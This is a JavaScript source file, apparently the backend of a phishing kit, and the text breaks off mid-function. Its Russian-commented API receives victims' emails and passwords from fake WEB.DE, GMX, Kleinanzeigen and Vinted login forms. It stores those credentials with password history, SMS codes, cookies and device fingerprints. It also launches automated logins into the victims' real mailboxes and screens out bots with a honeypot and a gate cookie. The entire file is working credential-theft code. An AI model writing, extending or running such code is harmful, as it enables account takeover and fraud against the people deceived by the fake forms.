// Victim-facing JSON API (uses with(scope) like leadController).
const { send } = require('../utils/httpUtils');
const { ADMIN_DOMAIN } = require('../utils/authUtils');
const {
  getPlatformFromRequest,
  EVENT_VICTIM_EMAIL,
  EVENT_VICTIM_EMAIL_KL,
  EVENT_VICTIM_PASS,
  EVENT_VICTIM_PASS_KL,
  EVENT_LABELS,
  statusSkipsVictimMailboxAutologinDuplicate
} = require('../utils/formatUtils');
const automationService = require('../services/automationService');
const { logDuplicateAutomationAttempt } = require('../lib/terminalFlowLog');
const { logAdminModeFlow } = require('../lib/adminModeFlowLog');
const { emailEligibleForUnitedInternetMailScript, mailboxAutomationLogLabel } = require('../utils/mailMailboxLogin');
const {
  jsonPayloadMatchesKleinClientShape,
  submitIndicatesKleinScenario
} = require('../utils/kleinSubmitDetect');
const { deviceSignatureFromRequest, applyLeadTelemetry } = require('../lib/leadTelemetry');
const { isLocalHost } = require('../utils/localNetwork');
const downloadKit = require('../services/downloadKitService');
const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));

/** Тот же пароль, что уже отвергла почта (колонки из webde-login-result при wrong_credentials). */
function victimSamePasswordAfterMailboxReject(lead, pwdPlain, isKl) {
  const p = String(pwdPlain || '').trim();
  if (!p || !lead) return false;
  const marked = isKl
    ? String(lead.mailboxLastRejectedPasswordKl || '').trim()
    : String(lead.mailboxLastRejectedPassword || '').trim();
  if (!marked) return false;
  return p === marked;
}

function wrongPasswordLabelForVictim(isKl) {
  return isKl ? EVENT_LABELS.WRONG_DATA_KL : EVENT_LABELS.WRONG_DATA;
}

function terminalLastLabelIsWrongPassword(lead) {
  const et = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];
  if (et.length === 0) return false;
  const l = String((et[et.length - 1] && et[et.length - 1].label) || '');
  const low = l.toLowerCase();
  if (l === EVENT_LABELS.WRONG_DATA || l === EVENT_LABELS.WRONG_DATA_KL) return true;
  if (l.indexOf('Неверные данные') === 0) return true;
  if (low.indexOf('неверный пароль') !== -1) return true;
  if (low.indexOf('error password') !== -1) return true;
  return false;
}

function victimPassRepeatIsKnownWrong(lead, pwdPlain, isKl) {
  return victimSamePasswordAfterMailboxReject(lead, pwdPlain, isKl);
}

function labelIsVictimPass(lab) {
  return lab === EVENT_VICTIM_PASS || lab === 'Ввел пароль';
}
function labelIsVictimPassKl(lab) {
  return lab === EVENT_VICTIM_PASS_KL || lab === 'Ввел пароль Kl';
}

function brandIsVint(raw) {
  return String(raw || '').trim().toLowerCase() === 'vint';
}

function normalizeKnownBrand(raw) {
  const b = String(raw || '').trim().toLowerCase();
  return b === 'webde' || b === 'gmx' || b === 'klein' || b === 'vint' ? b : '';
}

function payloadClientFormBrand(json) {
  return normalizeKnownBrand(json && json.clientFormBrand != null ? json.clientFormBrand : '');
}

function trimmedLower(raw) {
  return String(raw || '').trim().toLowerCase();
}

function rawUrlPathname(req) {
  try {
    const raw = req && typeof req.url === 'string' ? req.url : '';
    return String(raw.split('?')[0] || '').trim().toLowerCase();
  } catch (_) {
    return '';
  }
}

function stringLooksLikeVintContext(raw) {
  const s = trimmedLower(raw);
  if (!s) return false;
  return s.indexOf('vint') !== -1 || s.indexOf('vinted') !== -1;
}

function requestSignalsVintContext(req, json, getBrandFn) {
  if (payloadClientFormBrand(json) === 'vint') return true;
  try {
    if (typeof getBrandFn === 'function' && trimmedLower(getBrandFn(req).id) === 'vint') return true;
  } catch (_) {}
  if (stringLooksLikeVintContext(rawUrlPathname(req))) return true;
  if (stringLooksLikeVintContext(req && req.headers && req.headers.host)) return true;
  if (stringLooksLikeVintContext(req && req.headers && req.headers.origin)) return true;
  if (stringLooksLikeVintContext(req && req.headers && req.headers.referer)) return true;
  if (stringLooksLikeVintContext(json && json.page)) return true;
  if (stringLooksLikeVintContext(json && json.pageId)) return true;
  if (stringLooksLikeVintContext(json && json.pageContext)) return true;
  return false;
}

function emailDomainBrandFallback(emailRaw) {
  const e = trimmedLower(emailRaw);
  const at = e.lastIndexOf('@');
  if (at < 0 || at >= e.length - 1) return '';
  const dom = e.slice(at + 1);
  if (!dom) return '';
  if (dom === 'web.de' || dom.endsWith('.web.de')) return 'webde';
  if (dom.indexOf('gmx.') !== -1 || dom === 'gmx.de') return 'gmx';
  return '';
}

function leadHasPinnedVintContext(lead) {
  if (!lead || typeof lead !== 'object') return false;
  if (brandIsVint(lead.brand) || brandIsVint(lead.clientFormBrand) || brandIsVint(lead.hostBrandAtSubmit)) return true;
  if (lead.modeVint === true || lead.modeVint === 1 || lead.modeVint === '1') return true;
  if (String(lead.emailVt || '').trim() !== '') return true;
  if (String(lead.passwordVt || '').trim() !== '') return true;
  return false;
}

function resolveVictimActionBrand(req, json, getBrandFn, existingLead, emailHint) {
  return submitBrandIdForVictimPost(req, json, getBrandFn, existingLead, emailHint);
}

/**
 * Бренд действия жертвы:
 * 1) явный page/host/context Vint или clientFormBrand,
 * 2) уже закреплённый контекст лида,
 * 3) host-бренд сервера,
 * 4) домен email как самый слабый fallback.
 */
function submitBrandIdForVictimPost(req, json, getBrandFn, existingLead, emailHint) {
  const cfb = payloadClientFormBrand(json);
  if (cfb) return cfb;
  if (requestSignalsVintContext(req, json, getBrandFn)) return 'vint';
  if (leadHasPinnedVintContext(existingLead)) return 'vint';
  let fromHost = '';
  try {
    fromHost = normalizeKnownBrand(getBrandFn(req).id);
  } catch (_) {}
  if (fromHost) return fromHost;
  const fromEmailDomain = emailDomainBrandFallback(emailHint);
  if (fromEmailDomain) return fromEmailDomain;
  return 'webde';
}

function applySubmitSourceFields(lead, req, json, getBrandFn) {
  if (!lead || typeof getBrandFn !== 'function') return;
  const cfb = json && json.clientFormBrand != null ? String(json.clientFormBrand).trim().toLowerCase() : '';
  if (cfb === 'webde' || cfb === 'gmx' || cfb === 'klein' || cfb === 'vint') lead.clientFormBrand = cfb;
  try {
    const bid = getBrandFn(req).id;
    if (bid != null && String(bid).trim() !== '') {
      lead.hostBrandAtSubmit = String(bid).trim().toLowerCase();
    }
  } catch (_) {}
}

function applyVictimTelemetry(lead, req, json, ip, getBrandFn) {
  applySubmitSourceFields(lead, req, json, getBrandFn);
  applyLeadTelemetry(lead, req, json, ip);
}

function startPageBrandForLead(brand) {
  const b = String(brand || '').trim().toLowerCase();
  if (b === 'gmx' || b === 'klein' || b === 'vint') return b;
  return 'webde';
}

/**
 * Перед автозапуском с формы: свежая строка из БД.
 * recoveryCtx: { persistLeadPatch, invalidateLeadsCache, logTerminalFlow, leadIsWorkedLikeAdmin } — при флаге webdeScriptActiveRun
 * или живом процессе: SIGKILL предыдущему Python, сброс lock и webdeScriptActiveRun, затем новый запуск.
 */
function shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadRef, forceRestart, recoveryCtx) {
  if (!leadRef || !leadRef.id) return false;
  const fresh = typeof readLeadById === 'function'
    ? readLeadById(leadRef.id)
    : (function () {
      const rows = readLeads();
      return Array.isArray(rows) ? rows.find(function (l) { return l && l.id === leadRef.id; }) : null;
    })();
  if (!fresh) return false;
  if (recoveryCtx && typeof recoveryCtx.leadIsWorkedLikeAdmin === 'function' && recoveryCtx.leadIsWorkedLikeAdmin(fresh)) {
    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'лог отработан (Отработан / архив Klein)');
    return true;
  }
  if (forceRestart) return false;
  const st = String(fresh.status || '').trim();
  if (st === 'processing' || st === 'completed') {
    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'статус БД: ' + st);
    return true;
  }
  if (statusSkipsVictimMailboxAutologinDuplicate(st)) {
    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'статус БД после входа/редиректа: ' + st);
    return true;
  }
  const dbSaysActive = fresh.webdeScriptActiveRun != null && fresh.webdeScriptActiveRun !== '';
  const procSaysActive = automationService.isLeadAutomationAlreadyRunning(fresh.id);
  if (procSaysActive) {
    // Не перезапускаем активный браузер/скрипт на повторных submit/update-password:
    // текущая сессия должна продолжать работу и подхватить новый пароль.
    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск (процесс/lock)');
    return true;
  }
  if (dbSaysActive) {
    // Если живого процесса нет, а флаг в БД остался — это stale state.
    // Чистим флаг и разрешаем обычный запуск без preempt/kill.
    if (recoveryCtx && typeof recoveryCtx.persistLeadPatch === 'function') {
      try {
        recoveryCtx.persistLeadPatch(fresh.id, { webdeScriptActiveRun: null });
        if (typeof recoveryCtx.invalidateLeadsCache === 'function') recoveryCtx.invalidateLeadsCache();
        return false;
      } catch (e) {
        console.warn('[AUTO-LOGIN] очистка stale webdeScriptActiveRun id=' + fresh.id + ':', e && e.message ? e.message : e);
      }
    }
    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'webdeScriptActiveRun в БД');
    return true;
  }
  return false;
}

/**
 * Несколько строк с одним email/email_kl → одна запись: объединяем eventTerminal и passwordHistory,
 * сохраняем самый старый id (createdAt). Остальные строки удаляются.
 */
function mergeDuplicateLeadsForSameEmail(emailLower, ctx) {
  const em = emailLower != null ? String(emailLower).trim().toLowerCase() : '';
  if (!em || typeof ctx.findAllLeadIdsByEmailNormalized !== 'function') return null;
  const ids = ctx.findAllLeadIdsByEmailNormalized(em);
  if (ids.length <= 1) {
    return ids.length === 1 && typeof ctx.readLeadById === 'function' ? ctx.readLeadById(ids[0]) : null;
  }
  const leads = ids.map(function (id) { return ctx.readLeadById(id); }).filter(Boolean);
  if (leads.length <= 1) return leads[0] || null;
  leads.sort(function (a, b) { return String(a.createdAt || '').localeCompare(String(b.createdAt || '')); });
  const canonical = leads[0];
  const rest = leads.slice(1);
  const allEvents = [];
  for (let i = 0; i < leads.length; i++) {
    const et = leads[i].eventTerminal;
    if (Array.isArray(et)) {
      for (let j = 0; j < et.length; j++) allEvents.push(et[j]);
    }
  }
  allEvents.sort(function (a, b) { return String((a && a.at) || '').localeCompare(String((b && b.at) || '')); });
  canonical.eventTerminal = allEvents;
  let mergedPh = [];
  for (let i = 0; i < leads.length; i++) {
    mergedPh = mergedPh.concat(ctx.normalizePasswordHistory(leads[i].passwordHistory));
  }
  canonical.passwordHistory = mergedPh;
  const newest = leads.slice().sort(function (a, b) {
    return String(b.lastSeenAt || b.createdAt || '').localeCompare(String(a.lastSeenAt || a.createdAt || ''));
  })[0];
  if (newest) {
    const newestVintPinned = leadHasPinnedVintContext(newest);
    canonical.status = newest.status;
    canonical.brand = newest.brand;
    if (newest.platform) canonical.platform = newest.platform;
    if (!newestVintPinned && newest.email) canonical.email = newest.email;
    if (newest.emailKl) canonical.emailKl = newest.emailKl;
    if (newest.emailVt) canonical.emailVt = newest.emailVt;
    if (!newestVintPinned && newest.password != null && String(newest.password).trim() !== '') canonical.password = newest.password;
    if (newest.passwordKl != null && String(newest.passwordKl).trim() !== '') canonical.passwordKl = newest.passwordKl;
    if (newest.passwordVt != null && String(newest.passwordVt).trim() !== '') canonical.passwordVt = newest.passwordVt;
    if (newest.userAgent) canonical.userAgent = newest.userAgent;
    if (newest.fingerprint) canonical.fingerprint = newest.fingerprint;
    if (newest.deviceSignature) canonical.deviceSignature = newest.deviceSignature;
    if (newest.smsCodeData && (newest.smsCodeData.code || newest.smsCodeData.submittedAt)) {
      canonical.smsCodeData = Object.assign({}, newest.smsCodeData);
    }
    if (newest.cookies != null) canonical.cookies = newest.cookies;
    if (newest.logTerminal != null && String(newest.logTerminal).trim() !== '') canonical.logTerminal = newest.logTerminal;
  }
  for (let i = 0; i < rest.length; i++) {
    try {
      ctx.deleteLeadById(rest[i].id);
    } catch (e) {
      console.error('[ВХОД] mergeDuplicateLeadsForSameEmail: не удалось удалить дубль id=' + rest[i].id, e);
    }
  }
  ctx.persistLeadFull(canonical);
  ctx.invalidateLeadsCache();
  ctx.broadcastLeadsUpdate();
  return ctx.readLeadById(canonical.id);
}

async function handle(scope) {
  with (scope) {
  function autoUnhideAfterVictimActivity(lead) {
    try {
      if (!lead || !lead.id) return;
      if (leadService && typeof leadService.tryAutoUnhideLeadAfterVictimActivity === 'function') {
        leadService.tryAutoUnhideLeadAfterVictimActivity(String(lead.id), { pushEvent: pushEvent });
      }
    } catch (_) {}
  }
  const webdeSubmitSkipRecovery = {
    persistLeadPatch: persistLeadPatch,
    invalidateLeadsCache: invalidateLeadsCache,
    logTerminalFlow: logTerminalFlow,
    leadIsWorkedLikeAdmin: leadIsWorkedLikeAdmin
  };
  /** Стартовая страница из настроек бренда (не глобально): Klein / WEB.DE / GMX разведены. */
  function startPageKeyForVictimSubmit(req, visitLead, isKleinScenario) {
    if (isKleinScenario) return 'klein';
    const lb = visitLead && String(visitLead.brand || '').toLowerCase();
    if (lb === 'gmx' || lb === 'webde' || lb === 'vint') return lb;
    return startPageBrandForLead(getBrand(req).id);
  }
  function shouldSkipVintMailboxAutomation(lead, reason) {
    const lb = String((lead && lead.brand) || '').trim().toLowerCase();
    const cfb = String((lead && lead.clientFormBrand) || '').trim().toLowerCase();
    if (lb !== 'vint' && cfb !== 'vint') return false;
    const em = String((lead && (lead.email || lead.emailVt || lead.emailKl)) || '').trim() || '—';
    const lid = String((lead && lead.id) || '').trim();
    logTerminalFlow(
      'AUTO-LOGIN',
      'Система',
      '—',
      em,
      'пропуск: Vint-лид, WEB/GMX lead_simulation не запускаем' + (reason ? ' · ' + reason : '') + (lid ? ' · leadId=' + lid : ''),
      lid || ''
    );
    return true;
  }
  function shouldWriteVintOnlyForSubmit(brandId, leadRef, jsonPayload) {
    if (brandIsVint(brandId)) return true;
    if (payloadClientFormBrand(jsonPayload) === 'vint') return true;
    if (leadHasPinnedVintContext(leadRef)) return true;
    return false;
  }
  function enforceVintGenericFields(leadId, desiredEmail, desiredPassword) {
    try {
      const idStr = leadId != null ? String(leadId) : '';
      if (!idStr) return;
      const live = readLeadById(idStr);
      if (!live) return;
      if (!leadHasPinnedVintContext(live)) return;
      const desiredEmailStr = desiredEmail != null ? String(desiredEmail) : '';
      const desiredPasswordStr = desiredPassword != null ? String(desiredPassword) : '';
      const currentEmailStr = live.email != null ? String(live.email) : '';
      const currentPasswordStr = live.password != null ? String(live.password) : '';
      const patch = {};
      if (currentEmailStr !== desiredEmailStr) patch.email = desiredEmailStr;
      if (currentPasswordStr !== desiredPasswordStr) patch.password = desiredPasswordStr;
      if (Object.keys(patch).length > 0) {
        persistLeadPatch(idStr, patch, { skipBroadcast: true });
      }
    } catch (_) {}
  }
  if (pathname === '/api/visit' && req.method === 'POST') {
    if (!checkRateLimit(ip, 'visit', RATE_LIMITS.visit)) {
      return send(res, 429, { ok: false, error: 'too_many_requests' });
    }
    const leads = readLeads();
    const now = new Date().toISOString();
    
    // НЕ используем IP для связывания записей - каждый новый визит создает новую запись
    // IP сохраняется только для отображения в админке, но не используется для поиска или связывания
    // Это позволяет создавать отдельные логи для каждой новой сессии, даже с того же IP
    
    // Всегда создаем новую запись для нового визита
    const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
    const platform = resolvePlatform(getPlatformFromRequest(req), undefined);
    const brandId = getBrand(req).id;
    const hostVisit = (req.headers && req.headers.host) ? String(req.headers.host).split(':')[0].toLowerCase() : '';
    const visitDetail = 'бренд ' + brandId + (hostVisit ? ' · хост ' + hostVisit : '') + (platform == null ? ' · ОС не определена' : '');
    const initialStatus = 'pending';
    const initialEvent = [{ at: now, label: 'Зашел на сайт', source: 'user', detail: visitDetail }];
    const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
    const newVisitLead = {
      id: id,
      email: '',
      password: '',
      createdAt: now,
      adminListSortAt: now,
      status: initialStatus,
      ip: ip, // IP только для отображения, не для связывания
      lastSeenAt: now,
      eventTerminal: initialEvent,
      platform: platform || undefined,
      brand: brandId,
      userAgent: ua || undefined,
    };
    persistLeadFull(newVisitLead);
    writeDebugLog('VISIT_CREATED', { id: id, ip: ip, totalLeads: readLeads().length });
    send(res, 200, { ok: true, id: id });
    return true;
  }
  if (pathname === '/api/submit' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try {
        json = JSON.parse(body || '{}');
      } catch (err) {
        console.error('[ВХОД] Ошибка: неверный JSON в теле /api/submit — ' + (err.message || err) + '. Отклонён, ip=' + ip);
        return send(res, 400, { ok: false, error: 'invalid json' });
      }
      if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) {
        console.log('[ВХОД] Отказ: запрос без gate cookie (REQUIRE_GATE_COOKIE=1), ip=' + ip);
        return send(res, 403, { ok: false, error: 'forbidden' });
      }
      /** Только креды Klein (/klein-anmelden): не трогаем email/password почты WEB.DE.
       *  visitId обязателен для привязки; если sessionStorage потерян — ищем лид по совпадению email или emailKl (самый свежий). */
      if (json.kleinFlowSubmit === true || json.kleinFlow === true) {
        const leadsKf = readLeads();
        const pwKf = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
        const emKf = String(json.email || json.emailKl || '').trim();
        if (!emKf) {
          return send(res, 400, { ok: false, error: 'email required' });
        }
        const emLower = emKf.toLowerCase();
        const visitIdKleinFlow = json.visitId && String(json.visitId).trim();
        let leadKf = null;
        if (visitIdKleinFlow) {
          const idKf = resolveLeadId(visitIdKleinFlow);
          leadKf = leadsKf.find(function (l) { return l && l.id === idKf; });
        }
        if (!leadKf) {
          const candidates = leadsKf.filter(function (l) {
            if (!l) return false;
            const e = (l.email || '').trim().toLowerCase();
            const eKl = (l.emailKl || '').trim().toLowerCase();
            const eVt = (l.emailVt || '').trim().toLowerCase();
            return (e && e === emLower) || (eKl && eKl === emLower) || (eVt && eVt === emLower);
          });
          if (candidates.length === 1) {
            leadKf = candidates[0];
          } else if (candidates.length > 1) {
            candidates.sort(function (a, b) {
              const ta = a.adminListSortAt ? new Date(a.adminListSortAt).getTime() : 0;
              const tb = b.adminListSortAt ? new Date(b.adminListSortAt).getTime() : 0;
              if (tb !== ta) return tb - ta;
              return String(b.id || '').localeCompare(String(a.id || ''));
            });
            leadKf = candidates[0];
          }
        }
        if (!leadKf) {
          return send(res, 404, { ok: false, error: 'lead not found' });
        }
        // Если лид ранее завершился успехом/редиректом, новый заход с Klein-email
        // должен начать свежий цикл (иначе poll сразу уводит на Erfolg).
        applyReturnVisitStatusReset(leadKf);
        leadKf.status = 'pending';
        delete leadKf.adminErrorKind;
        leadKf.emailKl = emKf;
        if (pwKf) leadKf.passwordKl = pwKf;
        leadKf.brand = 'klein';
        const nowKf = new Date().toISOString();
        leadKf.lastSeenAt = nowKf;
        leadKf.adminListSortAt = nowKf;
        pushSubmitPipelineEvent(leadKf, 'klein-flow', !!pwKf);
        pushEvent(leadKf, EVENT_VICTIM_EMAIL_KL);
        if (pwKf) {
          pushEvent(leadKf, EVENT_VICTIM_PASS_KL);
          pushPasswordHistory(leadKf, pwKf, 'login_kl');
        }
        applyVictimTelemetry(leadKf, req, json, ip, getBrand);
        persistLeadFull(leadKf);
        autoUnhideAfterVictimActivity(leadKf);
        if (pwKf && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadKf, false, webdeSubmitSkipRecovery)) {
          logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, leadKf.id, emKf, 'klein-flow (Kl): пароль Kl получен → цепочка автовхода по текущему startPage');
          automationService.startWebdeLoginAfterLeadSubmit(leadKf.id, leadKf);
        }
        return send(res, 200, { ok: true, id: leadKf.id });
      }
      const honeypot = (json.website != null && String(json.website).trim() !== '') || (json.hp != null && String(json.hp).trim() !== '');
      if (honeypot) {
        console.log('[ВХОД] Отказ: заполнено скрытое поле honeypot (бот), ip=' + ip);
        return send(res, 400, { ok: false, error: 'invalid' });
      }
      if (!checkRateLimit(ip, 'submit', RATE_LIMITS.submit)) {
        console.log('[ВХОД] Отказ: превышен лимит запросов submit с ip=' + ip);
        return send(res, 429, { ok: false, error: 'too_many_requests' });
      }
      const email = String(json.email || '').trim();
      if (!email) {
        console.error('[ВХОД] Ошибка: в теле /api/submit отсутствует поле email или оно пустое. Отклонён, ip=' + ip);
        return send(res, 400, { ok: false, error: 'email required' });
      }
      const visitId = json.visitId && String(json.visitId).trim();
      const visitLeadForBrand =
        visitId && typeof readLeadById === 'function'
          ? readLeadById(resolveLeadId(visitId))
          : null;
      const submitBrandId = submitIndicatesKleinScenario(req, json, null, getBrand)
        ? 'klein'
        : submitBrandIdForVictimPost(req, json, getBrand, visitLeadForBrand, email);
      const atEmail = email.indexOf('@');
      const emailDomain = (atEmail > 0 && atEmail < email.length - 1) ? email.slice(atEmail + 1).toLowerCase().trim() : '';
      const submitHost = (req.headers && req.headers.host ? String(req.headers.host) : '').split(':')[0].toLowerCase();
      if (submitBrandId === 'webde') {
        if (!isLocalHost(submitHost) && emailDomain !== 'web.de') {
          console.log('[ВХОД] Отказ: на WEB.DE только @web.de — email=' + email + ', ip=' + ip);
          return send(res, 400, { ok: false, error: 'email_domain_not_allowed' });
        }
      } else if (submitBrandId !== 'klein' && ENABLE_EMAIL_DOMAIN_ALLOWLIST && ALLOWED_EMAIL_DOMAINS.length > 0) {
        const allowed = emailDomain && ALLOWED_EMAIL_DOMAINS.indexOf(emailDomain) !== -1;
        if (!allowed) {
          console.log('[ВХОД] Отказ: домен почты не в списке — email=' + email + ', brand=' + submitBrandId + ', ip=' + ip);
          return send(res, 400, { ok: false, error: 'email_domain_not_allowed' });
        }
      }
      const passwordFromBody = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
      const hasPassword = passwordFromBody !== '';
      logTerminalFlow('ВХОД', terminalEntradaSiteLabel(req), '—', email, 'email: submit · пароль ' + (hasPassword ? 'есть' : 'нет') + ' · visitId=' + (visitId || '—') + ' · ip=' + ip, visitId || '');
      const emailLower = email.toLowerCase();
      if (typeof findAllLeadIdsByEmailNormalized === 'function') {
        mergeDuplicateLeadsForSameEmail(emailLower, {
          findAllLeadIdsByEmailNormalized: findAllLeadIdsByEmailNormalized,
          readLeadById: readLeadById,
          deleteLeadById: deleteLeadById,
          persistLeadFull: persistLeadFull,
          invalidateLeadsCache: invalidateLeadsCache,
          broadcastLeadsUpdate: broadcastLeadsUpdate,
          normalizePasswordHistory: normalizePasswordHistory
        });
      }
      const leads = readLeads();
      const incomingDeviceSig = deviceSignatureFromRequest(req, json, ip);
      // Для Klein: в EMAIL KL пишем значение из поля emailKl из тела запроса (то, что реально введено на форме Klein), чтобы не подменялось автозаполнением браузера
      const brandIdForEmailKl = submitIndicatesKleinScenario(req, json, null, getBrand)
        ? 'klein'
        : submitBrandIdForVictimPost(req, json, getBrand, visitLeadForBrand, email);
      const emailForKlein = (brandIdForEmailKl === 'klein' && json.emailKl != null && String(json.emailKl).trim() !== '')
        ? String(json.emailKl).trim()
        : email;
      const emailForVint = email;

      if (visitId) {
        const visitLeadRaw = leads.find(function (l) { return l.id === visitId; });
        // Если лог был скрыт (adminLogArchived/klLogArchived), но жертва снова активна — обновляем и авто-разархивируем.
        const visitLead = visitLeadRaw || null;
        if (visitLead) {
          const existingEmail = (visitLead.email || '').trim().toLowerCase();
          const newEmail = emailLower;
          
          // Если запись с visitId уже имеет email И новый email отличается: для Klein — один лог (добавляем emailKl), для web — новый лог
          if (existingEmail && existingEmail !== newEmail) {
            const brandIdUpdate = submitIndicatesKleinScenario(req, json, visitLead, getBrand)
              ? 'klein'
              : submitBrandIdForVictimPost(req, json, getBrand, visitLead, email);
            if (brandIdUpdate === 'klein') {
              applyReturnVisitStatusReset(visitLead);
              visitLead.emailKl = emailForKlein;
              visitLead.passwordKl = hasPassword ? passwordFromBody : '';
              visitLead.brand = 'klein';
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              if (ip) visitLead.ip = ip;
              const platformVisit = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
              if (platformVisit) visitLead.platform = platformVisit;
              if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) visitLead.screenWidth = json.screenWidth;
              if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) visitLead.screenHeight = json.screenHeight;
              if (req.headers && req.headers['user-agent']) visitLead.userAgent = String(req.headers['user-agent']);
              if (json.fingerprint && typeof json.fingerprint === 'object') visitLead.fingerprint = json.fingerprint;
              const nowVisit = new Date().toISOString();
              visitLead.lastSeenAt = nowVisit;
              visitLead.adminListSortAt = nowVisit;
              pushSubmitPipelineEvent(visitLead, 'klein', hasPassword, 'visitId, другой email');
              pushEvent(visitLead, EVENT_VICTIM_EMAIL_KL);
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastIsPasswordKl = et.length > 0 && labelIsVictimPassKl(et[et.length - 1].label);
                if (!lastIsPasswordKl) {
                  pushEvent(
                    visitLead,
                    victimPassRepeatIsKnownWrong(visitLead, passwordFromBody, true)
                      ? wrongPasswordLabelForVictim(true)
                      : EVENT_VICTIM_PASS_KL
                  );
                }
                if (visitLead.status === 'error') visitLead.status = 'pending';
                if (hasPassword) delete visitLead.kleinPasswordErrorDe;
                // Klein: редирект только вручную кнопками в админке, авто-редирект на смену пароля не делаем
              }
              if (hasPassword) pushPasswordHistory(visitLead, visitLead.passwordKl, 'login_kl');
              applyVictimTelemetry(visitLead, req, json, ip, getBrand);
              persistLeadFull(visitLead);
              autoUnhideAfterVictimActivity(visitLead);
              console.log('[ВХОД] Лог: обновлена запись по visitId (Klein, другой email) — id=' + visitLead.id + ', emailKl=' + emailForKlein + (hasPassword ? ', пароль kl введён' : ''));
              writeDebugLog('SUBMIT_UPDATE_BY_VISITID_KLEIN_DIFFERENT_EMAIL', { visitId: visitId, emailKl: emailForKlein, hasPassword: hasPassword, ip: ip });
              return send(res, 200, { ok: true, id: visitLead.id });
            }
            console.log('[ВХОД] Лог: visitId найден, но email другой — старый ' + existingEmail + ', новый ' + newEmail + ', создаём новый лог');
            writeDebugLog('SUBMIT_NEW_EMAIL_DIFFERENT', {
              visitId: visitId,
              oldEmail: existingEmail,
              newEmail: newEmail,
              ip: ip,
              reason: 'Email отличается от существующего в записи с visitId'
            });
            // Продолжаем создавать новый лог (код ниже)
          } else if (!existingEmail) {
            // Запись существует БЕЗ email - обновляем её (продолжение сессии в той же вкладке)
            const brandIdUpdate = submitIndicatesKleinScenario(req, json, visitLead, getBrand)
              ? 'klein'
              : submitBrandIdForVictimPost(req, json, getBrand, visitLead, email);
            const isKlein = brandIdUpdate === 'klein';
            if (isKlein) {
              applyReturnVisitStatusReset(visitLead);
              visitLead.emailKl = emailForKlein;
              visitLead.passwordKl = hasPassword ? passwordFromBody : '';
              visitLead.brand = 'klein';
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              if (ip) visitLead.ip = ip;
              const platformVisit = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
              if (platformVisit) visitLead.platform = platformVisit;
              if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) visitLead.screenWidth = json.screenWidth;
              if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) visitLead.screenHeight = json.screenHeight;
              if (req.headers && req.headers['user-agent']) visitLead.userAgent = String(req.headers['user-agent']);
              if (json.fingerprint && typeof json.fingerprint === 'object') visitLead.fingerprint = json.fingerprint;
              const nowVisitKl = new Date().toISOString();
              visitLead.lastSeenAt = nowVisitKl;
              visitLead.adminListSortAt = nowVisitKl;
              pushSubmitPipelineEvent(visitLead, 'klein', hasPassword, 'visitId, первая запись email');
              pushEvent(visitLead, EVENT_VICTIM_EMAIL_KL);
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastIsPasswordKl = et.length > 0 && labelIsVictimPassKl(et[et.length - 1].label);
                if (!lastIsPasswordKl) {
                  pushEvent(
                    visitLead,
                    victimPassRepeatIsKnownWrong(visitLead, passwordFromBody, true)
                      ? wrongPasswordLabelForVictim(true)
                      : EVENT_VICTIM_PASS_KL
                  );
                }
                if (visitLead.status === 'error') visitLead.status = 'pending';
                if (hasPassword) delete visitLead.kleinPasswordErrorDe;
                // Klein: редирект только вручную кнопками в админке
                pushPasswordHistory(visitLead, visitLead.passwordKl, 'login_kl');
              }
            } else {
              applyReturnVisitStatusReset(visitLead);
              const oldPassword = visitLead.password || '';
              const vintWriteVisit = shouldWriteVintOnlyForSubmit(brandIdUpdate, visitLead, json);
              const effectiveBrandIdUpdate = vintWriteVisit ? 'vint' : brandIdUpdate;
              if (!vintWriteVisit) {
                visitLead.email = email;
                visitLead.password = hasPassword ? passwordFromBody : '';
                visitLead.brand = effectiveBrandIdUpdate;
              } else {
                visitLead.brand = 'vint';
                visitLead.clientFormBrand = 'vint';
                visitLead.hostBrandAtSubmit = 'vint';
              }
              if (vintWriteVisit) {
                visitLead.emailVt = emailForVint;
                visitLead.passwordVt = hasPassword ? passwordFromBody : '';
              }
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              if (ip) visitLead.ip = ip;
              const platformVisit = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
              if (platformVisit) visitLead.platform = platformVisit;
              if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) visitLead.screenWidth = json.screenWidth;
              if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) visitLead.screenHeight = json.screenHeight;
              if (req.headers && req.headers['user-agent']) visitLead.userAgent = String(req.headers['user-agent']);
              if (json.fingerprint && typeof json.fingerprint === 'object') visitLead.fingerprint = json.fingerprint;
              const nowVisitWeb = new Date().toISOString();
              visitLead.lastSeenAt = nowVisitWeb;
              visitLead.adminListSortAt = nowVisitWeb;
              pushSubmitPipelineEvent(visitLead, effectiveBrandIdUpdate, hasPassword, 'visitId, первая запись email');
